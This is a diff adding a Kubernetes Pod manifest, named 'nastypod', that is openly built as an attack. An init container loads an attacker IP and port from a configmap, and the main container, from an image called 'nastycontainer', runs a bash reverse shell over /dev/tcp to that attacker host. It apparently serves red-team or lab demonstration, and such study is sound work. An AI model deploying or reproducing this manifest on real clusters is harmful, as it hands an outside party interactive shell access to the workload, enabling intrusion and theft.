@@ -1,0 +1,38 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nastypod
+spec:
+  initContainers:
+  - name: attacker-init-container
+    image: ubuntu:latest
+    command: ["/bin/sh", "-c"]
+    args:
+    - echo "export ATTACKER_IP=$(cat /etc/config/attacker-configmap/ATTACKER_IP)" >> /etc/environment
+    - echo "export ATTACKER_PORT=$(cat /etc/config/attacker-configmap/ATTACKER_PORT)" >> /etc/environment
+    volumeMounts:
+    - name: config-volume
+      mountPath: /etc/config
+
+  containers:
+  - name: nastycontainer
+    image: bajacloud/nastycontainer:x86_64
+    command: ["/bin/bash", "-c"]
+    args:
+    - "/bin/bash -c \"/bin/bash -i >/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0<&1 2>&1\""
+    env:
+    - name: ATTACKER_IP
+      valueFrom:
+        configMapKeyRef:
+          name: attacker-configmap
+          key: ATTACKER_IP
+    - name: ATTACKER_PORT
+      valueFrom:
+        configMapKeyRef:
+          name: attacker-configmap
+          key: ATTACKER_PORT
+
+  volumes:
+  - name: config-volume
+    configMap:
+      name: attacker-configmap
